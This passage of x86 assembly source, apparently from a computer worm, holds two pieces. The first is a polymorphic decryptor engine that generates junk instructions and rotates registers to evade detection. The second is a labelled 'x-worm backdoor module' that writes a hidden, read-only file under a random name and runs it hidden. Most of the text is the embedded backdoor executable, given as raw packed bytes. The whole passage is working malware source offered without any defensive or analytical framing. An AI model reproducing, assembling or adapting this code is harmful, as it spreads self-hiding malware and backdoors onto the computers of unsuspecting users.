        add     ah,cl
        stosw
        jmp     g_dimension

test_regs:
        mov     ax,0c085h               ; test eax,eax
        push    eax
        call    get_random_al7
        mov     ch,al
        call    get_random_al7
        mov     cl,al
        pop     eax
        add     ah,ch
        jmp     common_test_xchg

temp_save_change:
        call    get_random_al7
        sub     al,6                    ; 1/4 probability, since this couldn't
        jc      skip_changer            ; come too often

        call    select_save
        jc      skip_changer

        push    ecx
        call    save_mov_xchg

        xchg    eax,ecx                 ; in al new register
        mov     al,byte ptr [edx]       ; imp_reg
        shl     al,3
        xchg    eax,ecx
        add     al,cl
        or      al,0c0h
        xchg    al,ah
        stosw                           ; mov important_reg,some_reg
        pop     ebx
        mov     byte ptr [r_used+ebp],bl    ; restore regs status
skip_changer:
        ret

select_save:
        call    get_random_al7
        sub     al,5                    ; get from 0 to 2
        jc      select_save

        xchg    eax,edx
        add     edx,offset r_pointer
        add     edx,ebp
        mov     al,byte ptr [edx]

        cmp     al,0ffh                 ; not already assigned?
        je      exit_bad

        cmp     al,20h                  ; no key signature, if so skip
        je      exit_bad

        call    is_used                 ; maybe is already saved on stack or
        jnz     return_good             ; such?
exit_bad:
        stc
        ret
return_good:
        mov     cl,byte ptr [r_used+ebp]
        clc
        ret

save_mov_xchg:
        xchg    eax,ebx
        call    get_register            ; get an usable register
        xchg    eax,ecx
        call    set_used                ; set this one as used
        call    unset_used              ; and the previous as unused
        mov     ah,087h                 ; xchg reg,reg base
        push    eax
        xor     ecx,ecx
        call    get_random              ; select if using mov or xchg
        shr     al,1
        jc      use_mov_first
        mov     cl,4                    ; + 4 becames mov reg,reg base
use_mov_first:
        shr     al,1                    ; when just saving this won't be used
        jc      use_mov_after           ; select whichone for restore aswell
        mov     ch,4
use_mov_after:
        pop     eax
        add     ah,ch                   ; restore one
        push    eax
        sub     ah,ch
        add     ah,cl
        shl     al,3                    ; * 8
        add     al,bl
        or      al,0c0h                 ; mov some_reg,important_reg
        xchg    al,ah
        stosw                           ; put the moving of regs
        call    rnd_garbage
        pop     eax
        ret


; tables for various purposes
garbage_offsets:
        dd      offset  call_subroutines
        dd      offset  gen_one_byters
        dd      offset  mov_registers
        dd      offset  mem_assign
        dd      offset  mem_mathops
        dd      offset  maths_immediate
        dd      offset  maths_immediate_short
        dd      offset  maths_registers
        dd      offset  rotating_imms
        dd      offset  notneg_register
        dd      offset  imm_assign
        dd      offset  inc_dec_reg
        dd      offset  xchg_regs
        dd      offset  test_regs
        dd      offset  temp_save_change
        dd      offset  cdq_jmps_savestack


one_byters      db      090h,0fch,0fdh,0f8h,0f9h,0f5h,070h,080h

change_jump     db      098h,099h,0ebh,0e9h

_math_imm:
        dw      008c1h  ; ror d[ebx],imm
        dw      02881h  ; sub d[ebx],imm
        dw      03081h  ; xor d[ebx],imm
        dw      00081h  ; add d[ebx],imm
        dw      000c1h  ; rol d[ebx],imm
_math_key:
        dw      008d3h  ; ror d[ebx],cl
        dw      00029h  ; sub d[ebx],eax
        dw      00031h  ; xor d[ebx],eax
        dw      00001h  ; add d[ebx],eax
        dw      000d3h  ; rol d[ebx],cl

; cmp,or,xor,sub,add
chk_counter     db      0f8h,0c8h
key_changers    db      0e8h,0f0h,0c0h  ; xor sub add
                db      0c0h,0c8h       ; ror rol
                db      040h,048h       ; inc dec

get_address:
        push    esi
        mov     ebx,edi
        lea     esi,[offset v_runnin + ebp]
        sub     ebx,dword ptr [esi - (offset v_runnin - offset t_inipnt)]
                                                ; actual decryptor lenght
        add     ebx,dword ptr [esi - (offset v_runnin - offset v_lenght)]

        mov     edx,dword ptr [esi]

                db      0b1h            ; mov cl,
t_memand        db      00h             ; significant bytes present

        add     edx,ebx

search_offset2:
        call    get_random
        shl     eax,cl
        shr     eax,cl
        cmp     eax,dword ptr [esi]     ; is < starting off of poly?
        jb      search_offset2
look_foroff2:
        cmp     eax,edx                 ; upper border
        jbe     ok_offset2
        sub     eax,ebx
        jmp     look_foroff2
ok_offset2:
        pop     esi
        ret

get_random_al7:
        call    get_random
        and     eax,0111b
        ret

get_random:
        push    ebx
        push    edx

        db     0b8h                     ; mov eax,
seed    dd     000h                     ; random seed, must be < im

        mov     ebx,4096d                ; ia
        mul     ebx
        add     eax,150889d              ; ic
        adc     edx,0
        mov     ebx,714025d              ; im
        push    ebx
        div     ebx
        mov     dword ptr [seed+ebp],edx
        xchg    eax,edx
        cdq
        xor     ebx,ebx
        dec     ebx
        mul     ebx                     ; * 2^32 - 1
        pop     ebx
        div     ebx                     ; here we have a 0<=rnd<=2^32
        pop     edx
        pop     ebx
        ret


is_used:
; AL register
        push    eax
        mov     cl,al
        mov     al,1
        shl     al,cl
        test    byte ptr [r_used+ebp],al
        pop     eax
; Z  = register not used
; NZ = register used
        ret

set_used:
; AL register
        push    eax
        mov     cl,al
        mov     al,1
        shl     al,cl
        or      byte ptr [r_used+ebp],al
        pop     eax
        ret

unset_used:
; BL register
        push    eax
        mov     cl,bl
        mov     al,1
        shl     al,cl
        not     al
        and     byte ptr [r_used+ebp],al
        pop     eax
        ret

get_register:
        push    eax
reget_reg:
        call    get_random_al7
        call    is_used
        jnz     reget_reg               ; check we aren't using it
; the is_used will put the reg in cl
        pop     eax
        ret

; how much memory does the ETMS need, so you can substract from the lenght
; of the virus on file of course
_mem_space      =       (offset _mem_data_end - offset _mem_data_start)

_mem_data_start:

t_inipnt        dd      00h             ; initial EDI

r_pointer       db      00h             ; register used as pointer
r_counter       db      00h             ; register used as counter
r_regkey        db      00h             ; register used as key, 20h use
                                        ; immediate as key
r_used          db      00000000b
;  bits meaning          0 0 0 1 0 0 0 0
;                        E E E E E E E E
;                        D S B S B D C A
;                        I I P P X X X X

t_chgpnt        db      00h             ; changes to be made to pointer
t_chgcnt        db      00h             ; changes to be made to counter
t_chgkey        db      00h             ; changes to be made to key register
t_chgmat        db      00h             ; changes to be made to operation

t_pntoff        dd      00h             ; offset added to pointer (00h if not
                                        ; added)
t_cntoff        dd      00h             ; constant to be added to counter
                                        ; value

t_fromend       db      00h             ; 00h from start, else from end
t_countback     db      00h             ; 00h decrementing, else incrementing
t_pushed        db      00h             ; pushed dwords
t_maxjmps       db      00h             ; max jumps
t_inacall       db      00h             ; into a call or not
                db      00h             ; just to optimize poly size :)

v_lenght        dd      00h             ; lenght
v_virusp        dd      00h             ; pointer to body
v_runnin        dd      00h             ; offset at which dec will run

w_counter       dd      00h             ; where counter is assigned - 1
w_pointer       dd      00h             ; where pointer is assigned - 1
w_loopbg        dd      00h             ; where loop begins
w_encrypt       dd      00h             ; pointer on current pos in encryptor

_mem_data_end:

;x-worm backdoor module

Backdoor:
	call	bDelta
bDelta:	pop	ebp
	sub	ebp,offset bDelta			;get delta offset
	
	call	InitRandomNumber			;init random number generator
	
	mov	ecx,7h
	lea	edi,[ebp + backdoor_filename]
@qRandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@qRandLetter				;gen random name for the backdoor

	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN
	push	OPEN_ALWAYS
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_WRITE
	lea	eax,[ebp + backdoor_filename]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	@ExitB
	
	push	eax					;push file handle
	push	0h
	call	pushNBW
	dd	0
pushNBW:push	SizeOfBackdoor
	lea	ebx,[ebp + BackdoorStart]
	push	ebx
	push	eax
	call	[ebp + WriteFile]			;write backdoor file
		
	call	[ebp + CloseHandle]			;close backdoor file
	
	push	0h					;SW_HIDE
	lea	eax,[ebp + backdoor_filename]
	push	eax
	call	[ebp + WinExec]				;execute backdoor

@ExitB:	push	eax
	call	[ebp + ExitThread]
	
	backdoor_filename	db	"x-worm_.cmd",0	;backdoor file name

BackdoorStart:	

db 04dh,05ah,090h,000h,003h,000h,000h,000h,004h,000h,000h,000h,0ffh,0ffh,000h
db 000h,0b8h,000h,000h,000h,000h,000h,000h,000h,040h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 0e0h,000h,000h,000h,00eh,01fh,0bah,00eh,000h,0b4h,009h,0cdh,021h,0b8h,001h
db 04ch,0cdh,021h,054h,068h,069h,073h,020h,070h,072h,06fh,067h,072h,061h,06dh
db 020h,063h,061h,06eh,06eh,06fh,074h,020h,062h,065h,020h,072h,075h,06eh,020h
db 069h,06eh,020h,044h,04fh,053h,020h,06dh,06fh,064h,065h,02eh,00dh,00dh,00ah
db 024h,000h,000h,000h,000h,000h,000h,000h,0ach,088h,01dh,091h,0e8h,0e9h,073h
db 0c2h,0e8h,0e9h,073h,0c2h,0e8h,0e9h,073h,0c2h,06bh,0f5h,07dh,0c2h,0e6h,0e9h
db 073h,0c2h,0deh,0cfh,079h,0c2h,0d9h,0e9h,073h,0c2h,0e8h,0e9h,073h,0c2h,0eeh
db 0e9h,073h,0c2h,08ah,0f6h,060h,0c2h,0e1h,0e9h,073h,0c2h,0e8h,0e9h,072h,0c2h
db 0a6h,0e9h,073h,0c2h,0deh,0cfh,078h,0c2h,0ebh,0e9h,073h,0c2h,052h,069h,063h
db 068h,0e8h,0e9h,073h,0c2h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,050h
db 045h,000h,000h,04ch,001h,002h,000h,07ch,014h,04eh,044h,000h,000h,000h,000h
db 000h,000h,000h,000h,0e0h,000h,00fh,001h,00bh,001h,006h,000h,000h,060h,000h
db 000h,000h,080h,000h,000h,000h,000h,000h,000h,050h,01bh,000h,000h,000h,010h
db 000h,000h,000h,070h,000h,000h,000h,000h,040h,000h,000h,010h,000h,000h,000h
db 002h,000h,000h,004h,000h,000h,000h,000h,000h,000h,000h,004h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,001h,000h,000h,004h,000h,000h,000h,000h,000h
db 000h,002h,000h,000h,000h,000h,000h,010h,000h,000h,010h,000h,000h,000h,000h
db 010h,000h,000h,010h,000h,000h,000h,000h,000h,000h,010h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,014h,0f0h,000h,000h,08fh,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,02eh,074h,065h,078h,074h,000h,000h,000h
db 000h,0e0h,000h,000h,000h,010h,000h,000h,000h,040h,000h,000h,000h,004h,000h
db 000h,050h,045h,043h,032h,000h,000h,000h,000h,000h,000h,000h,000h,020h,000h
db 000h,0e0h,02eh,072h,073h,072h,063h,000h,000h,000h,000h,010h,000h,000h,000h
db 0f0h,000h,000h,000h,00ah,000h,000h,000h,044h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,020h,000h,000h,0e0h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,0eah,08bh,000h,000h,083h,001h,0c0h,082h,005h,0ech,010h
db 055h,06ah,000h,001h,068h,0e0h,0cah,040h,000h,0c7h,044h,024h,01ch,000h,000h
db 001h,040h,0b3h,0c0h,0ffh,015h,01ch,071h,08bh,0e8h,085h,0edh,089h,06ch,024h
db 00ch,00fh,084h,0b0h,02eh,06ch,0cbh,069h,08bh,018h,056h,0c9h,04bh,065h,091h
db 068h,080h,017h,074h,094h,00bh,050h,055h,018h,0f0h,085h,0f6h,073h,01eh,0e8h
db 008h,086h,04ch,024h,020h,057h,080h,072h,0a3h,026h,0beh,002h,000h,00fh,0e7h
db 062h,040h,051h,058h,070h,0f8h,085h,0ffh,074h,05ah,08dh,054h,0a2h,089h,0f8h
db 002h,024h,010h,053h,08bh,01dh,014h,052h,08dh,02eh,000h,030h,02eh,017h,050h
db 056h,0ffh,0d3h,083h,0f8h,001h,075h,037h,08bh,02dh,05ch,04ch,000h,0eah,064h
db 014h,085h,0c0h,074h,025h,08dh,0dfh,085h,030h,0c1h,01ch,051h,0d9h,02eh,030h
db 02eh,01bh,052h,057h,0ffh,0d5h,014h,02fh,09ch,045h,06ah,013h,050h,051h,05bh
db 074h,01bh,02ch,074h,0d3h,08bh,018h,04ch,0cbh,07bh,041h,015h,064h,05bh,0f8h
db 058h,0ach,026h,015h,010h,05fh,055h,05eh,036h,0d8h,0c0h,002h,05dh,083h,0c4h
db 010h,0c3h,090h,057h,0b9h,000h,008h,005h,080h,00bh,080h,033h,0c0h,0bfh,0dch
db 0aah,0f3h,0abh,050h,0a1h,098h,069h,031h,04eh,08fh,020h,0c8h,017h,045h,08bh
db 068h,050h,048h,02dh,058h,0f5h,0f2h,05fh,081h,0ech,0c0h,001h,06ch,022h,00bh
db 0b0h,053h,056h,08bh,0b4h,024h,0cch,057h,047h,09ch,046h,028h,03ch,0b9h,007h
db 08dh,07ch,06ch,003h,007h,048h,033h,0dbh,050h,068h,001h,001h,0f3h,0a5h,089h
db 05ch,0f0h,0e9h,0a1h,09fh,028h,07fh,044h,0fdh,008h,00fh,085h,0c5h,011h,07bh
db 07bh,04ch,0cbh,002h,02ch,09ch,007h,038h,083h,083h,0ffh,0ffh,0a8h,08dh,0dch
db 0b2h,0deh,000h,00ch,055h,051h,068h,07eh,066h,004h,080h,050h,050h,016h,0bch
db 04dh,03ch,052h,034h,0e1h,044h,037h,0f1h,066h,089h,016h,00ch,079h,01ah,09bh
db 024h,038h,066h,05bh,044h,0adh,0c8h,014h,002h,038h,038h,0e3h,05ah,030h,018h
db 051h,06ah,040h,014h,039h,091h,023h,010h,0f0h,03bh,0f3h,074h,03eh,043h,0b3h
db 071h,050h,0e8h,00ah,02bh,002h,0b8h,09bh,003h,03ch,071h,004h,083h,0fbh,00ah
db 07eh,01bh,0f0h,04eh,040h,0d2h,035h,099h,0b9h,0dch,005h,0f7h,0f9h,0cbh,03ah
db 07dh,09bh,084h,056h,09ch,075h,08bh,038h,014h,06ah,085h,0ffh,010h,06ah,010h
db 052h,056h,057h,043h,093h,03ch,09dh,08bh,068h,070h,058h,09eh,0d4h,086h,0ebh
db 0c0h,040h,05dh,0ach,037h,0c2h,0c3h,044h,05fh,05eh,0b8h,041h,0c5h,00ch,0d8h
db 081h,0c4h,0c2h,004h,000h,0b4h,0c0h,0f1h,099h,008h,002h,08dh,084h,024h,004h
db 069h,0a3h,0dch,022h,0b9h,041h,033h,0a2h,091h,00eh,010h,002h,008h,007h,0ffh
db 076h,03ch,004h,020h,070h,0d0h,039h,0ech,008h,08dh,08ch,068h,050h,080h,04fh
db 061h,0cch,0b2h,01ch,09ch,023h,0efh,00bh,033h,0f6h,08bh,0cbh,098h,0e8h,009h
db 07eh,051h,08bh,03dh,031h,026h,062h,097h,018h,094h,046h,0f4h,0b7h,0d7h,00ch
db 052h,0bfh,088h,067h,0a0h,064h,0fdh,08bh,0bfh,0a8h,0b6h,087h,014h,008h,034h
db 0dbh,0bdh,005h,0d7h,01bh,038h,0c0h,013h,0d3h,046h,03bh,008h,001h,07ch,0cdh
db 05bh,05fh,089h,09ah,09ch,079h,05eh,0a3h,07ah,0aeh,037h,090h,093h,063h,0c7h
db 077h,0dch,006h,048h,004h,06eh,0f8h,0b1h,071h,0d3h,071h,0b7h,0c9h,04ch,0c0h
db 06ch,076h,093h,0a8h,048h,05bh,033h,0e9h,03ch,090h,0f5h,033h,03ch,069h,021h
db 077h,091h,074h,06ah,04ch,004h,066h,03ah,0d5h,0c5h,050h,044h,0b6h,0d8h,026h
db 020h,004h,052h,068h,002h,0f2h,04ah,02ch,0a1h,068h,0bch,081h,0dbh,0f6h,0d8h
db 096h,080h,008h,0efh,04bh,07ah,008h,075h,02ch,004h,011h,05dh,06eh,0afh,001h
db 080h,071h,060h,0f2h,02ch,099h,000h,08bh,086h,078h,028h,027h,004h,053h,055h
db 086h,057h,05bh,040h,068h,058h,026h,0bfh,00dh,0f5h,01fh,040h,039h,024h,053h
db 02bh,07eh,006h,0a5h,034h,065h,0d9h,050h,03ch,083h,08ah,085h,0eah,035h,038h
db 01dh,008h,071h,0a6h,08dh,0b1h,0c7h,02dh,04ch,090h,0ceh,020h,030h,033h,0ffh
db 089h,07ch,068h,030h,048h,0aeh,028h,0afh,0ffh,0d6h,04ch,083h,03eh,04dh,0a1h
db 0b3h,01eh,07dh,012h,0f8h,0d1h,002h,03ah,019h,000h,080h,0c2h,041h,0ebh,010h
db 061h,088h,0b9h,0b5h,088h,05eh,097h,047h,05ah,062h,0bbh,015h,0ebh,089h,001h
db 096h,0f5h,09dh,03bh,0f8h,07ch,0b4h,068h,03ch,06ch,009h,057h,068h,075h,05ch
db 0ffh,032h,027h,03ch,065h,0f3h,00dh,0bdh,0d9h,035h,065h,016h,0dch,068h,048h
db 0d7h,071h,0d0h,066h,014h,02dh,0abh,07fh,054h,0c7h,048h,048h,019h,093h,038h
db 0c2h,05ch,005h,052h,0dch,070h,0c0h,0a8h,0e8h,0feh,018h,025h,05eh,061h,06ah
db 006h,01ah,0d2h,069h,00ah,0ffh,0a3h,061h,018h,025h,074h,022h,005h,026h,099h
db 03dh,0c3h,068h,0a4h,030h,096h,0d8h,024h,0cbh,085h,000h,019h,03ch,00ah,0a2h
db 00bh,01ah,000h,028h,00eh,072h,03ch,0c8h,003h,014h,00fh,022h,02ah,08bh,047h
db 00ch,08bh,008h,015h,013h,0b0h,05ah,028h,050h,08bh,011h,08bh,00dh,062h,05ch
db 0feh,013h,051h,034h,024h,03ch,0f8h,067h,06ch,0c1h,004h,0b8h,0efh,0a4h,088h
db 051h,00bh,04bh,027h,0c8h,0b0h,0dch,014h,02bh,046h,068h,0a8h,02fh,013h,0b7h
db 048h,065h,0f1h,02ch,01bh,06ah,0b3h,068h,099h,0f0h,0d6h,08bh,015h,050h,0bah
db 0e2h,018h,05bh,0d5h,075h,0f4h,0bah,0d8h,068h,09ch,00ch,0b8h,0ech,0e6h,0b2h
db 075h,031h,038h,071h,0d5h,094h,0c3h,0e8h,01bh,029h,0cbh,000h,0e5h,081h,092h
db 056h,08ah,048h,006h,083h,0c0h,006h,000h,0b3h,068h,02dh,0bah,09ch,088h,00ah
db 001h,042h,040h,080h,0dch,084h,0a0h,005h,0f9h,00dh,075h,0f4h,068h,068h,088h
db 032h,099h,0dah,07ch,066h,079h,037h,031h,051h,0b8h,040h,0ffh,0feh,027h,020h
db 075h,0f7h,068h,084h,0d8h,09bh,06bh,09dh,0b1h,048h,0cch,03ch,0cah,003h,0d0h
db 068h,0c8h,0b4h,0cbh,01ch,011h,074h,08eh,0abh,0cfh,0fbh,060h,0afh,017h,0bch
db 0f9h,098h,03ch,07bh,024h,057h,04eh,003h,0c3h,008h,038h,0e4h,01fh,001h,0c7h
db 0f1h,08bh,00ch,075h,044h,08ah,00dh,0e2h,016h,034h,08fh,0c8h,088h,08ah,088h
db 0e3h,0efh,08ch,018h,02dh,0eeh,0b1h,01ch,0cdh,0a1h,0b9h,020h,08dh,0bch,04dh
db 0cbh,028h,023h,0d1h,01ch,0cah,029h,0d8h,003h,0aeh,09ah,075h,0dch,0dfh,029h
db 065h,079h,050h,0cdh,0c5h,061h,00bh,0d0h,000h,0bch,066h,09dh,07bh,0d2h,0f2h
db 08bh,0ech,068h,052h,054h,050h,0ddh,018h,0d7h,038h,058h,001h,051h,04ch,0ach
db 096h,038h,0bah,053h,018h,050h,0ach,061h,078h,0c3h,050h,00bh,0a9h,00bh,0c1h
db 014h,08ah,04ch,03ch,050h,088h,033h,06fh,010h,01ch,050h,052h,047h,0ech,00bh
db 0abh,000h,007h,060h,0d8h,0fbh,02fh,01eh,050h,068h,044h,0c9h,000h,0aeh,039h
db 0d7h,041h,002h,03ah,0bch,0d3h,094h,03ch,081h,057h,074h,0e2h,074h,075h,04ah
db 0cbh,024h,04bh,0aah,0aeh,048h,0bah,0f1h,037h,074h,051h,04bh,03ch,020h,09ah
db 04bh,0bfh,01ah,0c7h,005h,0dch,06dh,059h,090h,0ceh,00dh,083h,03dh,059h,0e7h
db 007h,073h,0dah,001h,010h,05bh,0e9h,028h,03ch,0d4h,008h,081h,0e8h,0bch,0f7h
db 0d4h,061h,09fh,031h,04ah,00dh,0dbh,073h,00ch,0c2h,0d5h,077h,01fh,076h,034h
db 0c2h,0c2h,0e6h,0c3h,050h,0e0h,080h,0ebh,099h,08fh,09bh,0bfh,041h,0feh,0e6h
db 068h,0d4h,080h,098h,03eh,04ch,094h,076h,03eh,0b2h,087h,032h,034h,02ch,0fdh
db 054h,0dah,033h,020h,034h,081h,039h,0b0h,04dh,011h,005h,0ebh,051h,08fh,060h
db 060h,0eah,000h,0dah,007h,085h,08eh,064h,050h,0f5h,0e7h,06fh,034h,028h,049h
db 01dh,007h,01bh,051h,0b4h,0bdh,0b8h,0e6h,034h,02ch,075h,005h,055h,0abh,068h
db 0a0h,080h,0cdh,0cbh,07ah,0ach,081h,000h,059h,086h,01ch,0f7h,0d4h,002h,0a4h
db 0e5h,039h,033h,044h,08ch,0a2h,08bh,037h,0d2h,070h,04fh,07fh,036h,030h,012h
db 0e8h,003h,029h,08bh,06ch,0e4h,000h,023h,057h,06dh,01eh,0ech,096h,01dh,057h
db 01bh,0fbh,052h,084h,095h,05eh,018h,0e6h,028h,013h,051h,0c7h,08ah,07ch,080h
db 044h,07ah,074h,053h,0f6h,018h,024h,01ch,0e9h,068h,043h,0e1h,0e9h,0b2h,041h
db 08bh,0d2h,069h,0d8h,05ah,05ch,080h,037h,014h,06eh,0ebh,0a9h,0fch,0d5h,098h
db 018h,051h,052h,059h,0bfh,0d2h,0fch,0e9h,08eh,061h,000h,0beh,003h,0bdh,05fh
db 05eh,05dh,063h,031h,0c0h,06ah,00ch,0b7h,091h,021h,0c2h,010h,004h,0a3h,0ech
db 081h,08ah,045h,075h,0c3h,0a1h,069h,0c0h,0fdh,043h,058h,0b5h,080h,072h,005h
db 0c3h,09eh,026h,000h,0c1h,0f8h,002h,000h,0a4h,00bh,010h,025h,0ffh,07fh,0c3h
db 055h,08bh,0ech,083h,0ech,020h,08bh,045h,008h,0c7h,045h,0ech,049h,020h,02ch
db 0e8h,098h,089h,045h,0e8h,0e0h,0e8h,002h,08eh,0b3h,02ch,0cch,00ch,0e4h,08dh
db 045h,010h,050h,0c2h,0a7h,002h,0c3h,0e0h,0ffh,075h,00ch,0fbh,002h,00bh,01ch
db 00ch,08ah,010h,0c9h,0c3h,0cch,0e8h,027h,000h,0c0h,057h,056h,053h,08bh,04dh
db 010h,0e3h,026h,08bh,0d9h,08bh,07dh,008h,08bh,0f7h,0f2h,00ch,040h,0bbh,000h
db 0aeh,0f7h,0d9h,003h,0cbh,08bh,0feh,08bh,0f3h,0a6h,08ah,046h,0ffh,033h,0c9h
db 03ah,05fh,000h,0c0h,037h,077h,004h,074h,004h,049h,049h,0f7h,0d1h,08bh,0c1h
db 05bh,05eh,05fh,05eh,04ch,0c2h,079h,050h,08eh,0c1h,0d0h,008h,057h,053h,0c0h
db 072h,022h,0eah,084h,0d2h,074h,069h,08ah,09bh,09dh,063h,002h,071h,001h,084h
db 0f6h,074h,04fh,00eh,006h,030h,00eh,007h,046h,038h,0d0h,074h,015h,084h,0e0h
db 048h,059h,090h,00bh,08ah,006h,00ah,075h,0f5h,05eh,010h,0b4h,020h,027h,05bh
db 05fh,0c3h,0f0h,075h,02fh,000h,01ch,000h,0ebh,08dh,07eh,0ffh,08ah,061h,002h
db 084h,0e4h,074h,028h,083h,0c6h,002h,038h,0e0h,075h,0c4h,08ah,041h,003h,02dh
db 0d2h,041h,018h,018h,08ah,066h,0c1h,0e9h,0f3h,02eh,008h,074h,0dfh,0ebh,0b1h
db 098h,00dh,0c3h,019h,08ah,0c2h,017h,0d1h,08dh,0a4h,062h,021h,073h,0c3h,08bh
db 0c7h,087h,03bh,088h,0ffh,06ah,0ffh,071h,070h,059h,010h,08eh,018h,034h,064h
db 0a1h,050h,064h,089h,023h,01ah,0e9h,058h,025h,058h,0e1h,05bh,001h,06dh,057h
db 089h,065h,0e8h,0b8h,070h,0d0h,098h,00ah,0c0h,033h,0d2h,08ah,0d4h,089h,015h
db 008h,0cbh,0c8h,081h,0e1h,021h,01bh,065h,0a7h,00dh,004h,087h,0b2h,0c0h,066h
db 0c1h,0e1h,008h,003h,0cah,000h,09ch,051h,05dh,040h,0e8h,010h,0a3h,0fch,0cah
db 0f6h,056h,087h,0ddh,0c7h,0f0h,022h,0bdh,059h,005h,034h,0cfh,060h,01ch,066h
db 059h,089h,075h,0fch,078h,034h,013h,091h,01fh,09dh,0b4h,0a3h,018h,0b2h,0c0h
db 0b2h,065h,0e0h,01eh,06bh,0a3h,0e4h,0cah,0c5h,023h,0b1h,058h,01ch,01eh,01bh
db 065h,018h,087h,060h,0bch,02bh,0d6h,0d0h,0a4h,038h,09ch,00ah,062h,0b0h,01bh
db 000h,000h,014h,043h,00dh,09ch,0f6h,045h,0d0h,001h,074h,006h,00fh,0b7h,045h
db 0d4h,0ebh,003h,06ah,00ah,058h,086h,005h,041h,0b7h,075h,09ch,056h,0b8h,0f0h
db 033h,030h,0ach,002h,0dbh,032h,086h,090h,0c5h,0a0h,018h,0b4h,0cbh,0cah,0b2h
db 00ch,0a1h,083h,04ch,002h,009h,089h,04dh,098h,01eh,01bh,078h,004h,019h,089h
db 059h,059h,078h,0dah,068h,00ch,075h,098h,0e8h,084h,005h,0b7h,085h,00eh,0ech
db 075h,005h,024h,0ebh,0ffh,074h,023h,044h,0ceh,038h,025h,024h,068h,0e7h,0f0h
db 02ch,04dh,0f0h,081h,02eh,03fh,0f2h,0beh,059h,0c8h,01fh,039h,05eh,0bch,070h
db 081h,017h,084h,0f5h,032h,0ech,0c4h,080h,065h,0ebh,043h,010h,00fh,0adh,033h
db 0dbh,057h,038h,0c1h,010h,020h,089h,05dh,0fch,073h,0c0h,047h,083h,0cch,0e1h
db 009h,05dh,062h,0d1h,01ah,0ebh,005h,000h,00fh,0d2h,0a2h,068h,083h,07eh,00fh
db 00fh,0b6h,0c0h,06ah,008h,090h,04eh,048h,0ddh,027h,0cbh,0ebh,00fh,0d4h,039h
